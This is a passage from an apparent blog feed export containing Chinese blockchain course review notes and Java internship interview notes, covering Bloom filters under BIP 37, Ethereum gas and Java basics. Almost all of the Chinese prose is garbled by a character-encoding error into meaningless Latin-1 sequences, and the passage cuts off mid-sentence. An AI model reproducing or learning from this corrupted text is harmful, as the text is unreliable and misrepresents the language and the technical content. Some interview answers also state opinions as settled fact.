<p>ä¸ºäº†ç”Ÿæˆå¤§é‡çš„å¯†é’¥å¯¹ï¼Œå¼•å…¥äº†HDé’±åŒ…çš„æ¦‚å¿µã€‚åº”è¯¥ç†è§£HDé’±åŒ…æ˜¯å¦‚ä½•ç”Ÿæˆå¤§é‡çš„å¯†é’¥çš„ã€‚</p>
<p>ä»¥ä¸Šæ˜¯æ¯”ç‰¹å¸çš„å†…å®¹ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¼€å§‹ä»‹ç»ä»¥å¤ªåŠã€‚ä»¥å¤ªåŠæä¾›äº†è¿œæ¯”æ¯”ç‰¹å¸å¹¿çš„åº”ç”¨åœºæ™¯ï¼Œä¸»è¦æ˜¯å› ä¸ºå®ƒå¤§å¤§æé«˜äº†åŒºå—çš„ç”Ÿæˆé€Ÿåº¦ï¼Œä»¥åŠæä¾›äº†å›¾çµå®Œå¤‡çš„è„šæœ¬è¯­è¨€ã€‚ä¸ºäº†æ”¯æŒè¿™äº›ç‰¹æ€§ï¼Œç›¸æ¯”äºæ¯”ç‰¹å¸ï¼Œå®ƒå¼•å…¥ä¸€äº›æ–°çš„æ¦‚å¿µï¼Œå¦‚Gasã€‚è¯·é—®Gasçš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>å¦å¤–ï¼Œä¸ºäº†æ”¯æŒåŸºäºè´¦æˆ·çš„äº¤æ˜“çš„æ”¯æŒï¼Œä»¥å¤ªåŠç»´æŠ¤äº†çŠ¶æ€æ ‘ï¼Œå› ä¸ºçŠ¶æ€æ ‘éœ€è¦ç»å¸¸æ›´æ–°ï¼Œæ‰€ä»¥ä»¥å¤ªåŠä½¿ç”¨äº†MPTã€‚è¦æ±‚èƒ½å¤Ÿæ ¹æ®ç»™å‡ºçš„é”®å€¼å¯¹ï¼Œç”»å‡ºç›¸åº”çš„MPTã€‚</p>
<p>æ¥ä¸‹æ¥é‡ç‚¹è€ƒè™‘äº†åŒºå—é“¾çš„å®‰å…¨é—®é¢˜ã€‚åŒºå—é“¾æœ¬èº«å¯èƒ½å—åˆ°æ”»å‡»ï¼Œä»¥å¤ªåŠä¸Šçš„æ™ºèƒ½åˆçº¦ä¹Ÿæœ‰å¯èƒ½å—åˆ°æ”»å‡»ã€‚ã€åœ¨ä»‹ç»æ™ºèƒ½åˆçº¦çš„å®‰å…¨é—®é¢˜æ—¶ï¼Œæˆ‘ä»¬è®¨è®ºäº†THE DAO å’Œ Fomo3dçš„æ”»å‡»ã€‚è¦èƒ½å¤Ÿç†è§£æ”»å‡»äº§ç”Ÿçš„åŸå› ã€‚ã€‘</p>
<p>Uniswapæ˜¯DeFiä¸­æœ€è‘—åçš„åè®®ä¹‹ä¸€ï¼Œåœ¨å…¶ä¸­é”å®šå’ŒæµåŠ¨ç€å·¨é¢çš„èµ„é‡‘ã€‚é‡ç‚¹ä»‹ç»äº†AMMçš„æ¦‚å¿µã€è®¡ç®—ï¼›åŒ…æ‹¬æ’å®šä¹˜ç§¯ã€æ»‘ç‚¹ã€æ— å¸¸æŸå¤±ç­‰ã€‚</p>
<hr>
<p>ç­”ç–‘è¯¾ä¸Šçš„å…±æ€§é—®é¢˜ï¼ŒSPVä½¿ç”¨bloom filterè¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œä¼šä»€ä¹ˆéœ€è¦æ›´æ–°bloom filterï¼Ÿ</p>
<p>BIP 37åœ¨å®ç°æ—¶ï¼Œæä¾›äº†Bloom_update_noneé€‰é¡¹ï¼Œä¹Ÿå³ä¸æ›´æ–°ã€‚ä¸»è¦æ˜¯å› ä¸ºï¼Œéšç€åŠ å…¥é¡¹çš„å¢å¤šï¼ŒBloom Filterçš„æ•ˆç‡ä¼šå˜ä½ï¼Œç”¨æˆ·å¯èƒ½éœ€è¦å®šæ—¶åˆ·æ–°filterã€‚åŒæ—¶ï¼Œæä¾›äº†Bloom_update_allé€‰é¡¹ï¼Œä¹Ÿå³ä¸Šæ–‡æåˆ°çš„å°†è¾“å‡ºä¸­çš„scriptpbkä¸­çš„outpointéƒ½åŠ å…¥è¿›æ¥ï¼›å¦å¤–ï¼Œè¿˜æä¾›äº†Bloom_update_P2PUBKEY_ONLYé€‰é¡¹ï¼Œä¹Ÿå³ä»…åœ¨è¾“å‡ºè„šæœ¬æ˜¯ pay-to-pubkeyæˆ–è€…æ˜¯pay to multisigå½¢å¼çš„æ—¶å€™æ‰å°†outpointæ·»åŠ åˆ°filterä¸­ã€‚</p>
<p>æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹è¿™æ ·åšçš„é“ç†ã€‚ä¸ºå•¥è¦åŠ å…¥outpointï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç†è§£outpointæ˜¯åŒ…æ‹¬äº†(txidï¼Œoutputid)çš„ä¸€ä¸ªæ•°æ®ç»“æ„ã€‚</p>
<p>å¦‚æœç”¨æˆ·è¦æŸ¥è¯¢ä»–çš„æ”¶å…¥çš„ï¼Œä¹Ÿå³éœ€è¦æŸ¥è¯¢æ‰€æœ‰çš„scriptpbkä¸­ä¸ä»–ç›¸å…³çš„äº¤æ˜“ã€‚é‚£ä¹ˆæ¥åˆ†æä¸€ä¸‹æˆ‘ä»¬ä»‹ç»çš„P2PKHã€P2PKã€P2multisigä»¥åŠP2SHè¿™å››ç§äº¤æ˜“ä¸­ï¼Œåˆ†åˆ«éœ€è¦æä¾›ä»€ä¹ˆä¿¡æ¯ã€‚</p>
<p>å¯¹äºP2PKHï¼Œåªéœ€è¦æä¾›å…¬é’¥çš„å“ˆå¸Œå°±èƒ½æŸ¥è¯¢åˆ°ï¼›å¯¹äºP2PKå’ŒP2multisigï¼Œåªéœ€è¦æä¾›å…¬é’¥å°±èƒ½æŸ¥è¯¢åˆ°ï¼›å¯¹äºP2SHï¼Œæä¾›è„šæœ¬çš„å“ˆå¸Œå°±èƒ½æŸ¥è¯¢åˆ°ã€‚è¿™äº›ä¿¡æ¯éƒ½æ˜¯å¯ä»¥æå‰ç¡®è®¤çš„ï¼Œæ‰€ä»¥å¹¶ä¸éœ€è¦æ›´æ–°filterã€‚</p>
<p>ä½†æ˜¯å½“ç”¨æˆ·è¦æŸ¥è¯¢ä»–çš„æ”¯å‡ºï¼Œæ­¤æ—¶ä¹Ÿå³è¦æŸ¥è¯¢æ‰€æœ‰çš„scriptsigã€‚è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦å‘filterä¸­æä¾›ä»€ä¹ˆä¿¡æ¯å‘¢ï¼Ÿ</p>
<p>å¯¹äºæ”¶æ¬¾äº¤æ˜“æ˜¯P2PKHçš„æƒ…å†µï¼Œåªéœ€è¦æä¾›å…¬é’¥å°±èƒ½æŸ¥è¯¢åˆ°ï¼›å¯¹äºæ”¶æ¬¾äº¤æ˜“æ˜¯P2SHçš„æƒ…å†µï¼Œæä¾›å°±èƒ½æŸ¥è¯¢åˆ°ï¼›è¿™äº›ä¿¡æ¯éƒ½æ˜¯å¯ä»¥æå‰ç¡®è®¤çš„ï¼Œæ‰€ä»¥å¹¶ä¸éœ€è¦æ›´æ–°filterã€‚ä½†æ˜¯å¯¹äºP2PKå’ŒP2multisigå‘¢ï¼Ÿä¸ºäº†ä»è¿™ä¸¤ç§äº¤æ˜“ä¸­èµå‡ºé’±ï¼Œéœ€è¦æä¾›çš„æ˜¯ç­¾åï¼Œä½†æ˜¯ç­¾åå¹¶ä¸èƒ½æå‰ç¡®è®¤ï¼›åœ¨è¿™ä¸ªscriptsigä¸­èƒ½å¤Ÿç¡®è®¤çš„å°±æ˜¯å®ƒæ˜¯ä»å“ªé‡Œèµå‡ºçš„é’±ï¼Œä¹Ÿå³outpointï¼Œæ‰€ä»¥ï¼Œéœ€è¦å‘filterä¸­æ·»åŠ è¿™äº›ä¿¡æ¯ã€‚</p>
]]></content>
      <categories>
        <category>åŒºå—é“¾</category>
      </categories>
      <tags>
        <tag>åŒºå—é“¾</tag>
        <tag>æ¯”ç‰¹å¸</tag>
        <tag>ä»¥å¤ªåŠ</tag>
      </tags>
  </entry>
  <entry>
    <title>å®ä¹ é¢è¯•</title>
    <url>/2021/12/21/%E9%9D%A2%E8%AF%95/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<h1 id="JavaåŸºç¡€"><a href="#JavaåŸºç¡€" class="headerlink" title="JavaåŸºç¡€"></a>JavaåŸºç¡€</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h4 id="å†…éƒ¨ç±»çš„ä¼˜ç‚¹å’Œç¼ºç‚¹"><a href="#å†…éƒ¨ç±»çš„ä¼˜ç‚¹å’Œç¼ºç‚¹" class="headerlink" title="å†…éƒ¨ç±»çš„ä¼˜ç‚¹å’Œç¼ºç‚¹"></a>å†…éƒ¨ç±»çš„ä¼˜ç‚¹å’Œç¼ºç‚¹</h4><p>å¯ä»¥è¢«privateå’Œprotectedä¿®é¥°</p>
<ul>
<li>ä¼˜ç‚¹: å†…éƒ¨ç±»å¯ä»¥éšæ„ä½¿ç”¨å¤–éƒ¨ç±»çš„æˆå‘˜å˜é‡ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰è€Œä¸ç”¨ç”Ÿæˆå¤–éƒ¨ç±»çš„å¯¹è±¡ï¼Œè¿™ä¹Ÿæ˜¯å†…éƒ¨ç±»çš„å”¯ä¸€ä¼˜ç‚¹ã€‚</li>
<li>ç¼ºç‚¹: ç ´åäº†åŸæœ‰ç±»çš„ç¨‹åºç»“æ„</li>
</ul>
<h4 id="switch-æ˜¯å¦èƒ½ä½œç”¨åœ¨-byte-long-String"><a href="#switch-æ˜¯å¦èƒ½ä½œç”¨åœ¨-byte-long-String" class="headerlink" title="switch æ˜¯å¦èƒ½ä½œç”¨åœ¨ byte,long,String"></a>switch æ˜¯å¦èƒ½ä½œç”¨åœ¨ byte,long,String</h4><p>Java 5 ä»¥å‰ï¼Œswitch(expr)ä¸­ï¼Œexpr åªèƒ½æ˜¯ byteã€shortã€charã€int</p>
<p>ä»  Java5 å¼€å§‹ï¼Œexpr å¯ä»¥æ˜¯ enum ç±»å‹</p>
<p>ä» Java 7  å¼€å§‹ï¼Œexpr è¿˜å¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼ˆStringï¼‰</p>
<p>é•¿æ•´å‹ï¼ˆlongï¼‰åœ¨ç›®å‰æ‰€æœ‰çš„ç‰ˆæœ¬ä¸­éƒ½æ˜¯ä¸å¯ä»¥çš„</p>
<h4 id="Javaè¯­è¨€é‡‡ç”¨ä½•ç§ç¼–ç æ–¹æ¡ˆï¼Ÿæœ‰ä½•ç‰¹ç‚¹ï¼Ÿ"><a href="#Javaè¯­è¨€é‡‡ç”¨ä½•ç§ç¼–ç æ–¹æ¡ˆï¼Ÿæœ‰ä½•ç‰¹ç‚¹ï¼Ÿ" class="headerlink" title="Javaè¯­è¨€é‡‡ç”¨ä½•ç§ç¼–ç æ–¹æ¡ˆï¼Ÿæœ‰ä½•ç‰¹ç‚¹ï¼Ÿ"></a>Javaè¯­è¨€é‡‡ç”¨ä½•ç§ç¼–ç æ–¹æ¡ˆï¼Ÿæœ‰ä½•ç‰¹ç‚¹ï¼Ÿ</h4><p>Unicodeï¼ˆæ ‡å‡†ç ï¼‰: å®ƒä¸ºæ¯ä¸ªå­—ç¬¦åˆ¶è®¢äº†ä¸€ ä¸ªå”¯ä¸€çš„æ•°å€¼ï¼Œå› æ­¤åœ¨ä»»ä½•çš„è¯­è¨€ï¼Œå¹³å°ï¼Œç¨‹åºéƒ½å¯ä»¥æ”¾å¿ƒçš„ä½¿ç”¨ã€‚</p>
<h4 id="åœ¨-Java-ä¸­ï¼Œå¦‚ä½•è·³å‡ºå½“å‰çš„å¤šé‡åµŒå¥—å¾ªç¯"><a href="#åœ¨-Java-ä¸­ï¼Œå¦‚ä½•è·³å‡ºå½“å‰çš„å¤šé‡åµŒå¥—å¾ªç¯" class="headerlink" title="åœ¨ Java ä¸­ï¼Œå¦‚ä½•è·³å‡ºå½“å‰çš„å¤šé‡åµŒå¥—å¾ªç¯"></a>åœ¨ Java ä¸­ï¼Œå¦‚ä½•è·³å‡ºå½“å‰çš„å¤šé‡åµŒå¥—å¾ªç¯</h4><p>åœ¨Javaä¸­ï¼Œè¦æƒ³è·³å‡ºå¤šé‡å¾ªç¯ï¼Œå¯ä»¥åœ¨å¤–é¢çš„å¾ªç¯è¯­å¥å‰å®šä¹‰ä¸€ä¸ªæ ‡å·ï¼Œç„¶ååœ¨é‡Œå±‚å¾ªç¯ä½“çš„ä»£ç ä¸­ä½¿ç”¨å¸¦æœ‰æ ‡å·çš„break è¯­å¥ï¼Œå³å¯è·³å‡ºå¤–å±‚å¾ªç¯ã€‚</p>
<h4 id="ç”¨æœ€æœ‰æ•ˆç‡çš„æ–¹æ³•è®¡ç®—-2-ä¹˜ä»¥-8"><a href="#ç”¨æœ€æœ‰æ•ˆç‡çš„æ–¹æ³•è®¡ç®—-2-ä¹˜ä»¥-8" class="headerlink" title="ç”¨æœ€æœ‰æ•ˆç‡çš„æ–¹æ³•è®¡ç®— 2 ä¹˜ä»¥ 8"></a>ç”¨æœ€æœ‰æ•ˆç‡çš„æ–¹æ³•è®¡ç®— 2 ä¹˜ä»¥ 8</h4><p>2 &lt;&lt; 3</p>
<h4 id="float-f-x3D-3-4-æ˜¯å¦æ­£ç¡®"><a href="#float-f-x3D-3-4-æ˜¯å¦æ­£ç¡®" class="headerlink" title="float f&#x3D;3.4;æ˜¯å¦æ­£ç¡®"></a>float f&#x3D;3.4;æ˜¯å¦æ­£ç¡®</h4><p>é”™,  åº”è¯¥å†™æˆfloat f &#x3D;(float)3.4æˆ– float f &#x3D;3.4F</p>
<h4 id="short-s1-x3D-1-s1-x3D-s1-1-æœ‰é”™å—-short-s1-x3D-1-s1-x3D-1-æœ‰é”™å—"><a href="#short-s1-x3D-1-s1-x3D-s1-1-æœ‰é”™å—-short-s1-x3D-1-s1-x3D-1-æœ‰é”™å—" class="headerlink" title="short s1 &#x3D; 1; s1 &#x3D; s1 + 1;æœ‰é”™å—? short s1 &#x3D; 1; s1 +&#x3D; 1;æœ‰é”™å—"></a>short s1 &#x3D; 1; s1 &#x3D; s1 + 1;æœ‰é”™å—? short s1 &#x3D; 1; s1 +&#x3D; 1;æœ‰é”™å—</h4><p>1 æ˜¯ int ç±»å‹ï¼Œå› æ­¤ s1+1 è¿ç®—ç»“æœä¹Ÿæ˜¯ intå‹ï¼Œéœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢</p>
<p>s1+&#x3D; 1;ç›¸å½“äº s1 &#x3D; (short(s1 + 1);å…¶ä¸­æœ‰éšå«çš„å¼ºåˆ¶ç±»å‹è½¬æ¢</p>
<h4 id="private-default-protected-public"><a href="#private-default-protected-public" class="headerlink" title="private,default,protected,public"></a>private,default,protected,public</h4><p>private : å½“å‰ç±»ã€‚ä½¿ç”¨å¯¹è±¡ï¼šå˜é‡ã€æ–¹æ³•<br>default: åŒåŒ…ã€‚ä½¿ç”¨å¯¹è±¡ï¼šç±»ã€æ¥å£ã€å˜é‡ã€æ–¹æ³•<br>protected : åŒåŒ…ï¼Œå­ç±»ã€‚ä½¿ç”¨å¯¹è±¡ï¼šå˜é‡ã€æ–¹æ³•<br>public : åŒåŒ…ï¼Œå­ç±»ï¼Œå…¶ä»–åŒ…ã€‚ä½¿ç”¨å¯¹è±¡ï¼šç±»ã€æ¥å£ã€å˜é‡ã€æ–¹æ³•</p>
<p> æ³¨æ„ï¼šprivateå’Œprotectedä¸èƒ½ä¿®é¥°ç±»ï¼ˆå¤–éƒ¨ç±»ï¼‰ã€‚å¤–éƒ¨ç±»å°±æ˜¯æ¨¡ç‰ˆ,ä½¿ç”¨privateå’Œprotectedä¿®é¥°å°±æ²¡æœ‰ä»»ä½•æ„ä¹‰</p>
<h4 id="3-0-1-x3D-x3D-0-3è¿”å›å€¼æ˜¯ä»€ä¹ˆ"><a href="#3-0-1-x3D-x3D-0-3è¿”å›å€¼æ˜¯ä»€ä¹ˆ" class="headerlink" title="3*0.1&#x3D;&#x3D;0.3è¿”å›å€¼æ˜¯ä»€ä¹ˆ"></a><strong>3*0.1&#x3D;&#x3D;0.3è¿”å›å€¼æ˜¯ä»€ä¹ˆ</strong></h4><p>falseï¼Œå› ä¸ºæœ‰äº›æµ®ç‚¹æ•°ä¸èƒ½å®Œå…¨ç²¾ç¡®çš„è¡¨ç¤ºå‡ºæ¥ã€‚</p>
<h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><p>è¢«finalä¿®é¥°çš„æ–¹æ³•ï¼ŒJVMä¼šå°è¯•å°†å…¶å†…è”ï¼Œä»¥æé«˜è¿è¡Œæ•ˆç‡</p>
<p>è¢«finalä¿®é¥°çš„å¸¸é‡ï¼Œåœ¨ç¼–è¯‘é˜¶æ®µä¼šå­˜å…¥å¸¸é‡æ± ä¸­</p>
<p>è¢«finalä¿®é¥°çš„ç±»ä¸å¯ä»¥è¢«ç»§æ‰¿</p>
<p>è¢«finalä¿®é¥°çš„æ–¹æ³•ä¸å¯ä»¥è¢«é‡å†™; </p>
<p>è¢«finalä¿®é¥°çš„å˜é‡ä¸å¯ä»¥è¢«æ”¹å˜, è¢«finalä¿®é¥°ä¸å¯å˜çš„æ˜¯å˜é‡çš„å¼•ç”¨, è€Œä¸æ˜¯å¼•ç”¨æŒ‡å‘çš„å†…å®¹;</p>
<p>finalä¸å¯å˜æ€§çš„ä¿è¯æ˜¯é ç¼–è¯‘å™¨æ¥ä¿è¯çš„; </p>
<h4 id="javaè¯­è¨€ç‰¹ç‚¹"><a href="#javaè¯­è¨€ç‰¹ç‚¹" class="headerlink" title="javaè¯­è¨€ç‰¹ç‚¹?"></a>javaè¯­è¨€ç‰¹ç‚¹?</h4><p>ç®€å•æ˜“å­¦; é¢å‘å¯¹è±¡; è·¨å¹³å°; æ”¯æŒå¤šçº¿ç¨‹; æ”¯æŒç½‘ç»œç¼–ç¨‹è€Œä¸”å¾ˆæ–¹ä¾¿(Java è¯­è¨€è¯ç”Ÿæœ¬èº«å°±æ˜¯ä¸ºç®€åŒ–ç½‘ç»œç¼–ç¨‹è®¾è®¡çš„ï¼Œå› æ­¤ Java è¯­è¨€ä¸ä»…æ”¯æŒç½‘ç»œç¼–ç¨‹è€Œä¸”å¾ˆæ–¹ä¾¿); ç¼–è¯‘å’Œè§£é‡Šå¹¶å­˜;</p>
<h4 id="JVM-JDK-JRE"><a href="#JVM-JDK-JRE" class="headerlink" title="JVM JDK JRE"></a>JVM JDK JRE</h4><p>jvm: è¿è¡Œjavaå­—èŠ‚ç çš„è™šæ‹Ÿæœº. æœ‰é’ˆå¯¹ä¸åŒç³»ç»Ÿçš„ç‰¹å®šå®ç°,ä½¿ç”¨ç›¸åŒçš„å­—èŠ‚ç ,åœ¨ä¸åŒç³»ç»Ÿä¸‹è¿è¡Œéƒ½ä¼šæœ‰ç›¸åŒçš„ç»“æœ.</p>
<p>classæ–‡ä»¶åˆ°æœºå™¨ç : åœ¨è¿™ä¸€æ­¥ JVMç±»åŠ è½½å™¨é¦–å…ˆåŠ è½½å­—èŠ‚ç æ–‡ä»¶ï¼Œç„¶åé€šè¿‡è§£é‡Šå™¨é€è¡Œè§£é‡Šæ‰§è¡Œï¼Œè¿™ç§æ–¹å¼çš„æ‰§è¡Œé€Ÿåº¦ä¼šç›¸å¯¹æ¯”è¾ƒæ…¢ã€‚è€Œä¸”ï¼Œæœ‰äº›æ–¹æ³•å’Œä»£ç å—æ˜¯ç»å¸¸éœ€è¦è¢«è°ƒç”¨çš„(ä¹Ÿå°±æ˜¯æ‰€è°“çš„çƒ­ç‚¹ä»£ç )ï¼Œæ‰€ä»¥åé¢å¼•è¿›äº† JIT(just-in-time) ç¼–è¯‘å™¨ï¼Œè€Œ JIT å±äºè¿è¡Œæ—¶ç¼–è¯‘ã€‚å½“ JIT ç¼–è¯‘å™¨å®Œæˆç¬¬ä¸€æ¬¡ç¼–è¯‘åï¼Œå…¶ä¼šå°†å­—èŠ‚ç å¯¹åº”çš„æœºå™¨ç ä¿å­˜ä¸‹æ¥ï¼Œä¸‹æ¬¡å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚è€Œæˆ‘ä»¬çŸ¥é“ï¼Œæœºå™¨ç çš„è¿è¡Œæ•ˆç‡è‚¯å®šæ˜¯é«˜äº Java è§£é‡Šå™¨çš„ã€‚è¿™ä¹Ÿè§£é‡Šäº†æˆ‘ä»¬ä¸ºä»€ä¹ˆç»å¸¸ä¼šè¯´ Java æ˜¯ç¼–è¯‘ä¸è§£é‡Šå…±å­˜çš„è¯­è¨€ã€‚</p>
<p>HotSpot é‡‡ç”¨äº†æƒ°æ€§è¯„ä¼°(Lazy Evaluation)çš„åšæ³•ï¼Œæ ¹æ®äºŒå…«å®šå¾‹ï¼Œæ¶ˆè€—å¤§éƒ¨åˆ†ç³»ç»Ÿèµ„æºçš„åªæœ‰é‚£ä¸€å°éƒ¨åˆ†çš„ä»£ç ï¼ˆçƒ­ç‚¹ä»£ç ï¼‰ï¼Œè€Œè¿™ä¹Ÿå°±æ˜¯ JIT æ‰€éœ€è¦ç¼–è¯‘çš„éƒ¨åˆ†ã€‚JVM ä¼šæ ¹æ®ä»£ç æ¯æ¬¡è¢«æ‰§è¡Œçš„æƒ…å†µæ”¶é›†ä¿¡æ¯å¹¶ç›¸åº”åœ°åšå‡ºä¸€äº›ä¼˜åŒ–ï¼Œå› æ­¤æ‰§è¡Œçš„æ¬¡æ•°è¶Šå¤šï¼Œå®ƒçš„é€Ÿåº¦å°±è¶Šå¿«ã€‚JDK 9 å¼•å…¥äº†ä¸€ç§æ–°çš„ç¼–è¯‘æ¨¡å¼ AOT(Ahead of Time Compilation)ï¼Œå®ƒæ˜¯ç›´æ¥å°†å­—èŠ‚ç ç¼–è¯‘æˆæœºå™¨ç ï¼Œè¿™æ ·å°±é¿å…äº† JIT é¢„çƒ­ç­‰å„æ–¹é¢çš„å¼€é”€ã€‚JDK æ”¯æŒåˆ†å±‚ç¼–è¯‘å’Œ AOT åä½œä½¿ç”¨ã€‚ä½†æ˜¯ ï¼ŒAOT ç¼–è¯‘å™¨çš„ç¼–è¯‘è´¨é‡æ˜¯è‚¯å®šæ¯”ä¸ä¸Š JIT ç¼–è¯‘å™¨çš„ã€‚</p>
<p>jdk: java development kit </p>
<p>jre: java runtime environment</p>
<p>æœ‰æ—¶ï¼Œå³ä½¿æ‚¨ä¸æ‰“ç®—åœ¨è®¡ç®—æœºä¸Šè¿›è¡Œä»»ä½• Java å¼€å‘ï¼Œä»ç„¶éœ€è¦å®‰è£… JDKã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¦ä½¿ç”¨ JSP éƒ¨ç½² Web åº”ç”¨ç¨‹åºï¼Œé‚£ä¹ˆä»æŠ€æœ¯ä¸Šè®²ï¼Œæ‚¨åªæ˜¯åœ¨åº”ç”¨ç¨‹åºæœåŠ¡å™¨ä¸­è¿è¡Œ Java ç¨‹åºã€‚é‚£ä½ ä¸ºä»€ä¹ˆéœ€è¦ JDK å‘¢ï¼Ÿå› ä¸ºåº”ç”¨ç¨‹åºæœåŠ¡å™¨ä¼šå°† JSP è½¬æ¢ä¸º Java servletï¼Œå¹¶ä¸”éœ€è¦ä½¿ç”¨ JDK æ¥ç¼–è¯‘ servletã€‚</p>
<h4 id="Oracle-JDK-å’Œ-Open-JDKçš„å¯¹æ¯”"><a href="#Oracle-JDK-å’Œ-Open-JDKçš„å¯¹æ¯”" class="headerlink" title="Oracle JDK å’Œ Open JDKçš„å¯¹æ¯”"></a>Oracle JDK å’Œ Open JDKçš„å¯¹æ¯”</h4><ol>
<li>OpenJDK æ˜¯ä¸€ä¸ªå‚è€ƒæ¨¡å‹å¹¶ä¸”æ˜¯å®Œå…¨å¼€æºçš„ï¼Œè€Œ Oracle JDK æ˜¯ OpenJDK çš„ä¸€ä¸ªå®ç°ï¼Œå¹¶ä¸æ˜¯å®Œå…¨å¼€æºçš„ï¼›</li>
<li>Oracle JDK æ¯” OpenJDK æ›´ç¨³å®šã€‚OpenJDK å’Œ Oracle JDK çš„ä»£ç å‡ ä¹ç›¸åŒï¼Œä½† Oracle JDK æœ‰æ›´å¤šçš„ç±»å’Œä¸€äº›é”™è¯¯ä¿®å¤ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨æƒ³å¼€å‘ä¼ä¸š&#x2F;å•†ä¸šè½¯ä»¶ï¼Œæˆ‘å»ºè®®æ‚¨é€‰æ‹© Oracle JDKï¼Œå› ä¸ºå®ƒç»è¿‡äº†å½»åº•çš„æµ‹è¯•å’Œç¨³å®šã€‚æŸäº›æƒ…å†µä¸‹ï¼Œæœ‰äº›äººæåˆ°åœ¨ä½¿ç”¨ OpenJDK å¯èƒ½ä¼šé‡åˆ°äº†è®¸å¤šåº”ç”¨ç¨‹åºå´©æºƒçš„é—®é¢˜ï¼Œä½†æ˜¯ï¼Œåªéœ€åˆ‡æ¢åˆ° Oracle JDK å°±å¯ä»¥è§£å†³é—®é¢˜ï¼›</li>
<li>åœ¨å“åº”æ€§å’Œ JVM æ€§èƒ½æ–¹é¢ï¼ŒOracle JDK ä¸ OpenJDK ç›¸æ¯”æä¾›äº†æ›´å¥½çš„æ€§èƒ½ï¼›</li>
<li>Oracle JDK ä¸ä¼šä¸ºå³å°†å‘å¸ƒçš„ç‰ˆæœ¬æä¾›é•¿æœŸæ”¯æŒï¼Œç”¨æˆ·æ¯æ¬¡éƒ½å¿…é¡»é€šè¿‡æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬è·å¾—æ”¯æŒæ¥è·å–æœ€æ–°ç‰ˆæœ¬ï¼›</li>
<li>Oracle JDK æ ¹æ®äºŒè¿›åˆ¶ä»£ç è®¸å¯åè®®è·å¾—è®¸å¯ï¼Œè€Œ OpenJDK æ ¹æ® GPL v2 è®¸å¯è·å¾—è®¸å¯ã€‚</li>
</ol>
<h4 id="javaå’Œc-çš„åŒºåˆ«"><a href="#javaå’Œc-çš„åŒºåˆ«" class="headerlink" title="javaå’Œc++çš„åŒºåˆ«?"></a>javaå’Œc++çš„åŒºåˆ«?</h4><ol>
<li><p>éƒ½æ˜¯é¢å‘å¯¹è±¡çš„è¯­è¨€,éƒ½æ”¯æŒå°è£…,ç»§æ‰¿,å¤šæ€</p>
</li>
<li><p>javaä¸æä¾›æŒ‡é’ˆç›´æ¥è®¿é—®å†…å­˜,ç¨‹åºæ›´åŠ å®‰å…¨</p>
</li>
<li><p>javaçš„ç±»æ˜¯å•ç»§æ‰¿çš„,c++æ”¯æŒå¤šç»§æ‰¿,ä½†javaæ¥å£å¯ä»¥å¤šç»§æ‰¿(ä¸ºäº†å¼¥è¡¥ä¸æ”¯æŒå¤šç»§æ‰¿çš„ç¼ºç‚¹)</p>
</li>
<li><p>javaæœ‰gc,ä¸éœ€è¦ç¨‹åºå‘˜æ‰‹åŠ¨é‡Šæ”¾æ— ç”¨å†…å­˜</p>
</li>
<li><p>åœ¨ C è¯­è¨€ä¸­ï¼Œå­—ç¬¦ä¸²æˆ–å­—ç¬¦æ•°ç»„æœ€åéƒ½ä¼šæœ‰ä¸€ä¸ªé¢å¤–çš„å­—ç¬¦â€™\0â€™æ¥è¡¨ç¤ºç»“æŸã€‚ä½†æ˜¯ï¼ŒJava è¯­è¨€ä¸­æ²¡æœ‰ç»“æŸç¬¦è¿™ä¸€æ¦‚å¿µã€‚</p>
<blockquote>
<p><a href="https://blog.csdn.net/sszgg2006/article/details/49148189">https://blog.csdn.net/sszgg2006/article/details/49148189</a></p>
<p>Javaé‡Œé¢ä¸€åˆ‡éƒ½æ˜¯å¯¹è±¡ï¼Œæ˜¯å¯¹è±¡çš„è¯ï¼Œå­—ç¬¦ä¸²è‚¯å®šå°±æœ‰é•¿åº¦ï¼Œå³ç„¶æœ‰é•¿åº¦ï¼Œç¼–è¯‘å™¨å°±å¯ä»¥ç¡®å®šè¦è¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°ï¼Œå½“ç„¶ä¹Ÿå°±æ²¡æœ‰å¿…è¦å»æµªè´¹é‚£1å­—èŠ‚çš„ç©ºé—´ç”¨ä»¥æ ‡æ˜å­—ç¬¦ä¸²çš„ç»“æŸäº†ã€‚æ¯”å¦‚ï¼Œæ•°ç»„å¯¹è±¡é‡Œæœ‰ä¸€ä¸ªå±æ€§length,å°±æ˜¯æ•°ç»„çš„é•¿åº¦ï¼ŒStringç±»é‡Œé¢æœ‰æ–¹æ³•length()å¯ä»¥ç¡®å®šå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå› æ­¤å¯¹äºè¾“å‡ºå‡½æ•°æ¥è¯´ï¼Œæœ‰ç›´æ¥çš„å¤§å°å¯ä»¥åˆ¤æ–­å­—ç¬¦ä¸²çš„è¾¹ç•Œï¼Œç¼–è¯‘å™¨å°±æ²¡å¿…è¦å†å»æµªè´¹ä¸€ä¸ªç©ºé—´æ 